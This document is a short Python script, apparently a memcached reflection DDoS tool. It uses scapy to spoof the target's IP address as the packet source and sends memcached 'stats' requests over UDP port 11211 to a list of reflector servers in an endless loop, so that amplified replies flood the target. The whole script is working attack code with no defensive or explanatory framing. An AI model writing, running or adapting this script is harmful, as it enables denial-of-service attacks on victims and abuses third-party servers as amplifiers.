from scapy.all import IP, UDP, Raw, send

target = input("Target ip>")

with open('ips.txt', 'r') as f:
        ips = f.readlines()

payload = input("[+] Enter payload contained inside packet: ") or "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"

while True:
    for ip in ips:
        send(IP(src=target, dst=ip) / UDP(dport=11211) / Raw(load=payload), count=100, verbose=0)